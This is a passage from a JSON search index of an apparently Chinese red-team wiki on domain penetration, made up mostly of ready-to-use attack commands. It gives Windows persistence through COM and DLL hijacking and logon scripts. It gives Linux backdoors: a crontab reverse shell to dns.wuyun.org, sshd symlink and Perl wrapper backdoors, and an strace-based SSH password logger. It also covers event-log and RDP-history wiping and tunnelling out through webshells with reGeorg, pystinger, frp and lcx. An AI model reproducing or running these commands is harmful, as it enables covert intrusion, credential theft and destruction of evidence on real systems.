\u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u5b9e\u73b0 POC\uff1a https://github.com/3gstudent/COM-Object-hijacking","title":"24\u3001Hijack CAccPropServicesClass and MMDeviceEnumerato"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#25hijack-explorerexe","text":"COM\u7ec4\u4ef6\u52ab\u6301\uff0c\u4e0d\u9700\u8981\u91cd\u542f\u7cfb\u7edf\uff0c\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 \u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u5b9e\u73b0 HKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1} HKCU\\Software\\Classes\\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9} HKCU\\Software\\Classes\\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} HKCU\\Software\\Classes\\Wow6432Node\\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}","title":"25\u3001Hijack explorer.exe"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#26windows-fax-dll-injection","text":"\u901a\u8fc7DLL\u52ab\u6301\uff0c\u52ab\u6301Explorer.exe\u5bf9 fxsst.dll \u7684\u52a0\u8f7d Explorer.exe\u5728\u542f\u52a8\u65f6\u4f1a\u52a0\u8f7d c:\\Windows\\System32\\fxsst.dll (\u670d\u52a1\u9ed8\u8ba4\u5f00\u542f\uff0c\u7528\u4e8e\u4f20\u771f\u670d\u52a1)\u5c06payload.dll\u4fdd\u5b58\u5728 c:\\Windows\\fxsst.dll \uff0c\u80fd\u591f\u5b9e\u73b0dll\u52ab\u6301\uff0c\u52ab\u6301Explorer.exe\u5bf9 fxsst.dll \u7684\u52a0\u8f7d","title":"26\u3001Windows FAX DLL Injection"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#27","text":"\u5728\u6ce8\u518c\u8868\u542f\u52a8\u9879\u521b\u5efa\u7279\u6b8a\u540d\u79f0\u7684\u6ce8\u518c\u8868\u952e\u503c\uff0c\u7528\u6237\u6b63\u5e38\u60c5\u51b5\u4e0b\u65e0\u6cd5\u8bfb\u53d6(\u4f7f\u7528Win32 API)\uff0c\u4f46\u7cfb\u7edf\u80fd\u591f\u6267\u884c(\u4f7f\u7528Native API)\u3002 \u300a\u6e17\u900f\u6280\u5de7\u2014\u2014\u201c\u9690\u85cf\u201d\u6ce8\u518c\u8868\u7684\u521b\u5efa\u300b \u300a\u6e17\u900f\u6280\u5de7\u2014\u2014\u201c\u9690\u85cf\u201d\u6ce8\u518c\u8868\u7684\u66f4\u591a\u6d4b\u8bd5\u300b","title":"27\u3001\u7279\u6b8a\u6ce8\u518c\u8868\u952e\u503c"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#28","text":"\u66ff\u6362\u6211\u7684\u7535\u8111\u5feb\u6377\u65b9\u5f0f\u542f\u52a8\u53c2\u6570 POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1","title":"28\u3001\u5feb\u6377\u65b9\u5f0f\u540e\u95e8"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#29logon-scripts","text":"New-ItemProperty \"HKCU:\\Environment\\\" UserInitMprLogonScript -value \"c:\\test\\11.bat\" -propertyType string | Out-Null","title":"29\u3001Logon Scripts"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#30password-filter-dll","text":"","title":"30\u3001Password Filter DLL"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#31bhoie","text":"","title":"31\u3001\u5229\u7528BHO\u5b9e\u73b0IE\u6d4f\u89c8\u5668\u52ab\u6301"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#linux_3","text":"","title":"Linux"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#crontab","text":"\u6bcf60\u5206\u949f\u53cd\u5f39\u4e00\u6b21shell\u7ed9dns.wuyun.org\u768453\u7aef\u53e3 #!bash (crontab -l;printf \"*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n\")|crontab -","title":"crontab"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#sshd","text":"#!bash ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333; \u94fe\u63a5\uff1assh root@192.168.206.142 -p 2333","title":"\u786c\u94fe\u63a5sshd"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ssh-server-wrapper","text":"#!bash cd /usr/sbin mv sshd ../bin echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if (getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec {\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd //\u4e0d\u7528\u91cd\u542f\u4e5f\u884c /etc/init.d/sshd restart socat STDIO TCP4:192.168.206.142:22,sourceport=13377","title":"SSH Server wrapper"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ssh-keylogger","text":"vim\u5f53\u524d\u7528\u6237\u4e0b\u7684.bashrc\u6587\u4ef6,\u672b\u5c3e\u6dfb\u52a0 #!bash alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' source .bashrc","title":"SSH keylogger"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#cymothoa_backdoor","text":"./cymothoa -p 2270 -s 1 -y 7777 nc -vv ip 7777","title":"Cymothoa_\u8fdb\u7a0b\u6ce8\u5165backdoor"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#rootkit","text":"openssh_rootkit Kbeast_rootkit Mafix + Suterusu rootkit","title":"rootkit"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#tools","text":"Vegile backdoor","title":"Tools"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#14","text":"","title":"14.\u75d5\u8ff9\u6e05\u7406"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#windows_4","text":"\u83b7\u53d6\u65e5\u5fd7\u5206\u7c7b\u5217\u8868\uff1a wevtutil el >1.txt \u83b7\u53d6\u5355\u4e2a\u65e5\u5fd7\u7c7b\u522b\u7684\u7edf\u8ba1\u4fe1\u606f\uff1a eg. wevtutil gli \"windows powershell\" \u56de\u663e\uff1a creationTime: 2016-11-28T06:01:37.986Z lastAccessTime: 2016-11-28T06:01:37.986Z lastWriteTime: 2017-08-08T08:01:20.979Z fileSize: 1118208 attributes: 32 numberOfLogRecords: 1228 oldestRecordNumber: 1 \u67e5\u770b\u6307\u5b9a\u65e5\u5fd7\u7684\u5177\u4f53\u5185\u5bb9\uff1a wevtutil qe /f:text \"windows powershell\" \u5220\u9664\u5355\u4e2a\u65e5\u5fd7\u7c7b\u522b\u7684\u6240\u6709\u4fe1\u606f\uff1a wevtutil cl \"windows powershell\"","title":"Windows\u65e5\u5fd7\u6e05\u9664"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#windows_5","text":"\u5229\u7528\u5de5\u5177 Invoke-Phant0m Windwos-EventLog-Bypass","title":"\u7834\u574fWindows\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#metasploit","text":"run clearlogs clearev","title":"Metasploit"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#3389","text":"@echo off @reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f @del \"%USERPROFILE%\\My Documents\\Default.rdp\" /a @exit","title":"3389\u767b\u9646\u8bb0\u5f55\u6e05\u9664"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#15","text":"\u533a\u5206\u6b63\u5411\u4ee3\u7406\u4e0e\u53cd\u5411\u4ee3\u7406 A\u2014-b\u2014-C A\u53bb\u8bf7\u6c42C,B\u4f5c\u4e3a\u4ee3\u7406\uff0c\u4ee3\u66ffA\u53bb\u8bbf\u95eeC\uff0c\u5e76\u5c06\u8fd4\u56de\u7684\u7ed3\u679c\u8f6c\u53d1\u7ed9A \u90a3\u4e48B\u5c31\u662f\u6b63\u5411\u4ee3\u7406 B\u4e3b\u52a8\u4e0eA\u76848888\u7aef\u53e3\u8fde\u63a5\uff0c\u5e76\u5c06A:8888\u7684\u8bbf\u95ee\u8f6c\u53d1\u5230C:80\u4e0a\u53bb\uff0c\u5e76\u5c06\u7ed3\u679c\u8f6c\u53d1\u7ed9A,\u5219B\u662f\u53cd\u5411\u4ee3\u7406 \u53cd\u5411\u4ee3\u7406\u4f18\u52bf: \u5f53AB\u4e4b\u95f4\u6709\u9632\u706b\u5899\uff0c\u4e0d\u5141\u8bb8A\u8fdeB,\u4f46\u662f\u5141\u8bb8B\u8fdeA","title":"15.\u5185\u7f51\u7a7f\u900f"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#0x01","text":"","title":"0x01 \u573a\u666f\u4e0e\u601d\u8def\u5206\u6790"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_41","text":"\u601d\u8def \uff1a\u7531\u4e8e\u9632\u706b\u5899\u5bf9\u51fa\u53e3\u6d41\u91cf\u6ca1\u6709\u4efb\u4f55\u7aef\u53e3\u9650\u5236\uff0c\u6211\u4eec\u7684\u53ef\u9009\u62e9\u7684\u65b9\u6848\u975e\u5e38\u7075\u6d3b\uff0c\u5982\uff1a\u53cd\u5f39shell","title":"\u573a\u666f\u4e00\uff1a\u5185\u7f51\u9632\u706b\u5899\u5bf9\u51fa\u53e3\u6d41\u91cf\u6ca1\u6709\u4efb\u4f55\u7aef\u53e3\u9650\u5236"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#80-443","text":"\u601d\u8def\uff1a\u7531\u4e8e\u9632\u706b\u5899\u4ec5\u5141\u8bb8\u90e8\u5206\u7279\u5b9a\u5916\u7f51\u7aef\u53e3\u53ef\u4ee5\u8bbf\u95ee\uff0c\u601d\u8def\u4e00\u4ecd\u7136\u662f\u53cd\u5f39shell\u53ea\u4e0d\u8fc7\u76ee\u6807\u7aef\u53e3\u6539\u6210\u7279\u5b9a\u7aef\u53e3\u5373\u53ef\uff1b\u601d\u8def\u4e8c\u5219\u662f\u7aef\u53e3\u8f6c\u53d1\uff0c\u5c06\u5185\u7f51\u4e3b\u673a\u7684\u67d0\u4e9b\u670d\u52a1\u7684\u7aef\u53e3\u8f6c\u53d1\u5230\u5916\u7f51\u653b\u51fb\u4e3b\u673a\u4e0a\u7684\u9632\u706b\u5899\u5141\u8bb8\u7684\u7279\u5b9a\u7aef\u53e3\u4e0a\uff0c\u518d\u901a\u8fc7\u8fde\u63a5\u5916\u7f51\u4e3b\u673a\u4e0a\u7684\u672c\u5730\u7aef\u53e3\u6765\u8bbf\u95ee\u5185\u7f51\u670d\u52a1 \u65b9\u6cd5\u4e00\uff1a\u53cd\u5f39shell\u53ef\u53c2\u8003\u573a\u666f\u4e00\u4e2d\u7684\u65b9\u6cd5\uff0c\u4ec5\u9700\u4fee\u6539\u76ee\u6807\u7aef\u53e3\u4e3a\u9632\u706b\u5899\u5141\u8bb8\u7684\u7279\u5b9a\u7aef\u53e3\u5373\u53ef \u65b9\u6cd5\u4e8c\uff1a\u7aef\u53e3\u8f6c\u53d1 \u65b9\u6cd5\u4e09\uff1aSSH\u7684\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1\u914d\u5408proxychains\u6765\u4ee3\u7406\u6240\u6709\u6d41\u91cf\u8fdb\u4e00\u6b65\u6e17\u900f\u5185\u7f51 1.\u5728\u5185\u7f51\u4e3b\u673a\u4e0a\u6267\u884c ssh -f -N -R 2222:127.0.0.1:22 -p 80 root@192.168.0.230 (\u8f93\u5165\u5916\u7f51\u4e3b\u673a\u7684SSH\u53e3\u4ee4) 2.\u5728\u5916\u7f51\u4e3b\u673a\u4e0a\u6267\u884c ssh -f -N -D 127.0.0.1:8080 -p 2222 avfisher@127.0.0.1 (\u8f93\u5165\u5185\u7f51\u4e3b\u673a\u7684SSH\u53e3\u4ee4) 3.\u5728\u5916\u7f51\u4e3b\u673a\u4e0a\u914d\u7f6eproxychains\u8bbe\u7f6esocks4\u4ee3\u7406 $ vim /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 8080 4.\u4f7f\u7528proxychains\u4ee3\u7406\u6240\u6709\u6d41\u91cf\u8fdb\u5165\u5185\u7f51 proxychains nc -nv 10.0.2.5 3306","title":"\u573a\u666f\u4e8c\uff1a\u5185\u7f51\u9632\u706b\u5899\u4ec5\u5141\u8bb8\u5185\u7f51\u4e3b\u673a\u8bbf\u95ee\u5916\u7f51\u7684\u7279\u5b9a\u7aef\u53e3\uff08\u5982\uff1a80, 443\uff09"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#tcp-http","text":"\u4e00.reGeorg reGeorg\u539f\u7248\uff1a https://github.com/sensepost/reGeorg reGeorg\u4fee\u6539\u7248\uff1a https://github.com/L-codes/Neo-reGeorg \u5047\u8bbe\u62ff\u5230\u7684Webshell\u662f http://aaa.com/shell.jsp\uff0c \u4ee5\u539f\u7248reGeorg\u4e3a\u4f8b\u3002 \u4e0a\u4f20reGeorg\u4e2d\u7684 tunnel.jsp\uff0c\u5047\u8bbe\u5f53\u524dURL\u4e3ahttp://aaa.com/tunnel.jsp \u5728\u672c\u5730PC\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4 python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http://aaa.com/tunnel.jsp \u6b64\u65f6\uff0c\u5c06\u5728\u672c\u5730PC\u76848080\u5f00\u542f\u4e00\u4e2aSocks\u7aef\u53e3\uff0c\u4f7f\u7528Proxifier\u5373\u53ef\u8fdb\u884c\u4ee3\u7406\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u8fd9\u4e2ahttp\u4ee3\u7406\u96a7\u9053\u6bd4\u8f83\u8106\u5f31\uff0c\u5efa\u8bae\u6839\u636e\u6bcf\u4e2a\u76ee\u6807host\u5355\u72ec\u6dfb\u52a0\u89c4\u5219\uff0c\u6700\u597d\u4e0d\u8981\u8bbe\u7f6e\u6210\u5168\u5c40\u4ee3\u7406\u3002 \u4e8c.pystinger \u8702\u523a-stinger_client pystinger \u6574\u4f53\u7ed3\u6784\uff1a 1.\u4e0a\u4f20 proxy.jsp\u5230\u76ee\u6807Web\u670d\u52a1\u5668\uff0c\u4e0a\u4f20stinger_server/stinger_server.exe\u5230\u76ee\u6807\u7cfb\u7edf\u3002 2.\u4f7f\u7528Webshell\u542f\u52a8stinger_server Linux: chmod +x /tmp/stinger_server nohup /tmp/stinger_server>/dev/null nohup.out & Windows: start D:/XXX/stinger_server.exe 3.VPS\u670d\u52a1\u7aef\u542f\u52a8\u76d1\u542c ./stinger_client -w http://aaa.com/proxy.jsp -l 0.0.0.0 -p 60000 \u4ee5\u4e0a\u64cd\u4f5c\u6210\u529f\u540e\uff0cVPS\u4f1a\u76d1\u542c60000\u7aef\u53e3\uff0c\u63a5\u4e0b\u6765\u76f4\u63a5\u914d\u7f6e\u597dProxifier\u5c31\u53ef\u4ee5\u8bbf\u95ee\u76ee\u6807\u5185\u7f51\u4e86\u3002 \u7279\u522b\u6ce8\u610f\uff1a\u8fd9\u4e2a\u4ee3\u7406\u4e5f\u4e0d\u662f\u5f88\u7a33\u5b9a\uff0c\u6709\u65f6\u5019\u4f1a\u65ad\u5f00(Wrong data)\u3002\u9047\u5230\u65ad\u5f00\u60c5\u51b5\u540e\uff0c\u624b\u52a8kill stinger_server\u8fdb\u7a0b \u518d\u542f\u52a8\uff0c\u6700\u540e\u91cd\u542fVPS\u670d\u52a1\u7aefstinger_client\u5373\u53ef","title":"\u573a\u666f\u4e09\uff1aTCP\u4e0d\u51fa\u7f51-HTTP\u4ee3\u7406"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#tcp-socks","text":"frp \u642d\u5efa\u6b65\u9aa4\uff1a 1.VPS\u8fd0\u884c\u670d\u52a1\u7aef ./frps -c frps.ini \u6ce8\uff1a\u5efa\u8bae\u7528Screen\u5c06frp\u6302\u8d77\u5230\u540e\u53f0\uff0cScreen\u6302\u8d77\u7a0b\u5e8f\u53c2\u8003 \u7528screen \u5728\u540e\u53f0\u8fd0\u884c\u7a0b\u5e8f - \u7b80\u4e66 frps.ini\u5185\u5bb9\uff1a [common] bind_port = 8080 tls_only = true tcp_mux = true privilege_token = token123 kcp_bind_port = 8080 2.\u4f7f\u7528VPS\u5c06frpc frpc.ini\u4e0a\u4f20\u5230\u4e3b\u673atmp\u76ee\u5f55\uff0c\u7136\u540e\u8fd0\u884c Linux: chmod +x /tmp/frpc-x86 nohup /tmp/frpc-x86 -c /tmpfrpc.ini>/dev/null nohup.out & Windows frpc -c frpc.ini \u6ce8\uff1a\u6709\u65f6\u5019\u7528Webshell\u7ba1\u7406\u5de5\u5177\u4f1a\u4e0a\u4f20\u5931\u8d25\u6216\u4e0a\u4f20\u6587\u4ef6\u4e0d\u5b8c\u6574\uff0c\u53ef\u4ee5cd\u5230frp\u76ee\u5f55\uff0c\u5728vps\u4f7f\u7528 python -m SimpleHTTPServer 80 \u542f\u52a8\u4e00\u4e2awebserver\uff0c\u7136\u540e\u5728\u5ba2\u6237\u7aef\u4f7f\u7528 curl http://vpsip/frpc \u4e0b\u8f7d\u6587\u4ef6\u3002 \u4ee5\u4e0a\u64cd\u4f5c\u6210\u529f\u540e\uff0cVPS\u63a7\u5236\u53f0\u4f1a\u6709\u8f93\u51fa\uff0c\u7136\u540eVPS\u4f1a\u542f\u52a8\u4e00\u4e2a10001\u7aef\u53e3\uff0c\u63a5\u4e0b\u6765\u76f4\u63a5\u914d\u7f6e\u597dProxifier\u5c31\u53ef\u4ee5\u8bbf\u95ee\u76ee\u6807\u5185\u7f51\u4e86\u3002 Proxifier\u4f7f\u7528\u53c2\u8003\uff1a Proxifier Socks5 \u4ee3\u7406\uff08\u5185\u7f51\u8bbf\u95ee\u3001\u8fdc\u7a0b\u529e\u516c\uff09 ps\uff1afrp\u4f1a\u6d89\u53ca\u5230\u514d\u6740\u7684\u95ee\u9898\uff0c\u8fd9\u91cc\u63a8\u8350\u53e6\u4e00\u4e2a\u4ee3\u7406\u5de5\u5177\uff0c\u4f53\u79ef\u66f4\u5c0f\uff0c\u53ef\u4ee5\u770b\u4f5c\u662frust\u7248\u672c\u7684frp fuso","title":"\u573a\u666f\u56db TCP\u51fa\u7f51-socks\u4ee3\u7406"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#0x02-lcx","text":"\u5185\u7f51IP\uff1a192.168.183.168 \u516c\u7f51IP\uff1a192.168.183.181","title":"0x02 Lcx"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_42","text":"\u5185\u7f51\u673a\u5668\u4e0a\u6267\u884c\u547d\u4ee4\uff1a lcx.exe \u2013slave \u516c\u7f51IP \u7aef\u53e3 \u5185\u7f51IP \u7aef\u53e3 \u5c06\u5185\u7f51\u76843389\u7aef\u53e3\u8f6c\u53d1\u5230\u516c\u7f51\u76846666\u7aef\u53e3 lcx.exe -slave 192.168.183.181 6666 192.168.183.168 3389 lcx.exe -slave 192.168.183.181 6666 127.0.0.1 3389 \u516c\u7f51\u673a\u5668\u4e0a\u6267\u884c\u547d\u4ee4\uff1a lcx.exe -listen \u76d1\u542c\u7aef\u53e3 \u8fde\u63a5\u7aef\u53e3 \u5c06\u57286666\u7aef\u53e3\u63a5\u6536\u5230\u7684\u6570\u636e\u8f6c\u53d1\u52302222\u7aef\u53e3 lcx.exe -listen 6666 2222 \u4f7f\u7528\u547d\u4ee4 mstsc /v:127.0.0.1:2222 \u5373\u53ef\u8fde\u63a5\u5230\u5185\u7f513389\u7aef\u53e3","title":"\u7aef\u53e3\u8f6c\u53d1"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_43","text":"\u5982\u679c\u5185\u7f51\u673a\u5668\u9632\u706b\u5899\u7981\u6b623389\u51fa\u7ad9\uff0c\u53ef\u4ee5\u4f7f\u7528tran\u547d\u4ee4\u5c063389\u7aef\u53e3\u6620\u5c04\u5230\u5176\u4ed6\u7aef\u53e3\u4e0a \u5185\u7f51\u673a\u5668\u4e0a\u6267\u884c\u547d\u4ee4\uff1a lcx.exe -tran \u6620\u5c04\u7aef\u53e3 \u8fde\u63a5IP \u8fde\u63a5\u7aef\u53e3 lcx.exe -tran 66 192.168.183.168 3389 \u56e0\u4e3a\u5b9e\u9a8c\u73af\u5883\u662f\u5185\u7f51\u6240\u4ee5\u76f4\u63a5\u8fde\u63a566\u7aef\u53e3\u5373\u53ef\u8bbf\u95ee3389\u7aef\u53e3\uff0c\u516c\u7f51\u8fd8\u9700\u8981\u7aef\u53e3\u8f6c\u53d1","title":"\u7aef\u53e3\u6620\u5c04"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#0x03-ssh","text":"ssh\u53c2\u6570\u8be6\u89e3\uff1a -C Enable compression \u538b\u7f29\u6570\u636e\u4f20\u8f93 -q Quiet mode. \u5b89\u9759\u6a21\u5f0f -T Disable pseudo-tty allocation. \u4e0d\u5360\u7528 shell -f Requests ssh to go to background just before command execution. \u540e\u53f0\u8fd0\u884c\uff0c\u5e76\u63a8\u8350\u52a0\u4e0a -n \u53c2\u6570 -N Do not execute a remote command. \u4e0d\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4\uff0c\u7aef\u53e3\u8f6c\u53d1\u5c31\u7528\u5b83 -L port:host:hostport \u5c06\u672c\u5730\u673a(\u5ba2\u6237\u673a)\u7684\u67d0\u4e2a\u7aef\u53e3\u8f6c\u53d1\u5230\u8fdc\u7aef\u6307\u5b9a\u673a\u5668\u7684\u6307\u5b9a\u7aef\u53e3. -R port:host:hostport \u5c06\u8fdc\u7a0b\u4e3b\u673a(\u670d\u52a1\u5668)\u7684\u67d0\u4e2a\u7aef\u53e3\u8f6c\u53d1\u5230\u672c\u5730\u7aef\u6307\u5b9a\u673a\u5668\u7684\u6307\u5b9a\u7aef\u53e3. -D port \u6307\u5b9a\u4e00\u4e2a\u672c\u5730\u673a\u5668\u52a8\u6001\u7684\u5e94\u7528\u7a0b\u5e8f\u7aef\u53e3\u8f6c\u53d1. -g port \u5141\u8bb8\u8fdc\u7a0b\u4e3b\u673a\u8fde\u63a5\u5230\u5efa\u7acb\u7684\u8f6c\u53d1\u7684\u7aef\u53e3\uff0c\u5982\u679c\u4e0d\u52a0\u8fd9\u4e2a\u53c2\u6570\uff0c\u53ea\u5141\u8bb8\u672c\u5730\u4e3b\u673a\u5efa\u7acb\u8fde\u63a5","title":"0x03 SSH\u96a7\u9053"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ssh","text":"\u8bed\u6cd5\u683c\u5f0f\uff1a ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host \u8fdc\u7a0b\u7ba1\u7406\u670d\u52a1\u5668\u4e0a\u7684mysql\uff0cmysql\u4e0d\u80fd\u76f4\u63a5root\u8fdc\u7a0b\u767b\u9646\u3002\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u901a\u8fc7\u672c\u5730\u8f6c\u53d1\uff0c\u901a\u8fc7ssh\u5c06\u670d\u52a1\u5668\u76843306\u7aef\u53e3\u8f6c\u53d1\u52301234\u7aef\u53e3\u3002 ssh -CfNg -L 2222:127.0.0.1:3306 root@139.196.xx.xx \u5de5\u4f5c\u539f\u7406\uff1a\u5728\u672c\u5730\u6307\u5b9a\u4e00\u4e2a\u7531ssh\u76d1\u542c\u7684\u8f6c\u53d1\u7aef\u53e32222\uff0c\u5c06\u8fdc\u7a0b\u4e3b\u673a\u76843306\u7aef\u53e3(127.0.0.1:3306)\u6620\u5c04\u5230\u672c\u5730\u76842222\u7aef\u53e3\uff0c\u5f53\u6709\u4e3b\u673a\u8fde\u63a5\u672c\u5730\u6620\u5c04\u76842222\u7aef\u53e3\u65f6\uff0c\u672c\u5730ssh\u5c31\u5c06\u6b64\u7aef\u53e3\u7684\u6570\u636e\u5305\u8f6c\u53d1\u7ed9\u4e2d\u95f4\u4e3b\u673aVPS\uff0c\u7136\u540eVPS\u518d\u4e0e\u8fdc\u7a0b\u4e3b\u673a\u7aef\u53e3(127.0.0.1:3306)\u901a\u4fe1\u3002 \u6570\u636e\u6d41\u5411\uff1aKali -> 2222 -> VPS -> 127.0.0.1:3306","title":"SSH\u672c\u5730\u8f6c\u53d1"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ssh_1","text":"\u8bed\u6cd5\u683c\u5f0f\uff1a ssh -R [bind_addr:]remote1_port:host:port remote1 \u5047\u8bbekali\u5f00\u4e86\u4e00\u4e2a80\u7aef\u53e3\u7684web\u670d\u52a1\uff0c\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\uff0c\u4f7f\u7528\u8fdc\u7a0b\u8f6c\u53d1\uff0c\u5c06kali\u768480\u7aef\u53e3\u8f6c\u53d1\u5230\u5916\u7f51\u7684\u5176\u4ed6\u7aef\u53e3\uff0c\u8fd9\u65f6\u5019\u8bbf\u95ee\u5916\u7f51\u7684\u7aef\u53e3\uff0c\u5c31\u8bbf\u95ee\u5230\u4e86\u5185\u7f51\u7684\u7aef\u53e3\u3002 ssh -CfNg -R 4444:127.0.0.1:80 root@192.168.183.195 \u6b64\u65f6\u5728192.168.183.195\u8fd9\u53f0\u4e3b\u673a\u4e0a\u8bbf\u95ee127.0.0.1:4444\u7aef\u53e3\u5373\u53ef\u8bbf\u95ee\u5230kali\u768480\u7aef\u53e3 \u5de5\u4f5c\u539f\u7406\uff1akali\u5728\u8bf7\u6c42\u5916\u7f51\u4e3b\u673a\u7684sshd\u670d\u52a1\uff0c\u5728\u5916\u7f51\u4e3b\u673a\u4e0a\u5efa\u7acb\u4e00\u4e2a\u5957\u63a5\u5b57\u76d1\u542c\u7aef\u53e3(4444)\uff0c\u5b83\u662fkali\u768480\u7aef\u53e3\u7684\u6620\u5c04\uff0c\u5f53\u6709\u4e3b\u673a\u8fde\u63a5\u5916\u7f51\u76844444\u7aef\u53e3\u65f6\uff0c\u8fde\u63a5\u7684\u6570\u636e\u5168\u90e8\u8f6c\u53d1\u7ed9kali\uff0c\u518d\u7531kali\u53bb\u8bbf\u95ee127.0.0.1:80\u3002 \u8fd9\u91cc\u8981\u6ce8\u610f\u4e00\u70b9\uff0c\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\u662f\u7531\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u7684sshd\u670d\u52a1\u63a7\u5236\u7684\uff0c\u9ed8\u8ba4\u914d\u7f6e\u60c5\u51b5\u4e0b\uff0csshd\u670d\u52a1\u53ea\u5141\u8bb8\u672c\u5730\u5f00\u542f\u7684\u8fdc\u7a0b\u8f6c\u53d1\u7aef\u53e3(4444)\u7ed1\u5b9a\u5728\u73af\u56de\u5730\u5740(127.0.0.1)\u4e0a\uff0c\u5373\u4f7f\u663e\u5f0f\u6307\u5b9a\u4e86bind_addr\u4e5f\u65e0\u6cd5\u8986\u76d6\u3002\u4e5f\u5c31\u662f\u8fd9\u91cc\u8bbf\u95ee127.0.0.1:4444\u7aef\u53e3\u53ef\u4ee5\u8bbf\u95ee\u6210\u529f\uff0c\u8bbf\u95ee192.168.183.195:4444\u5374\u4e0d\u80fd\u8bbf\u95ee\u6210\u529f\u3002 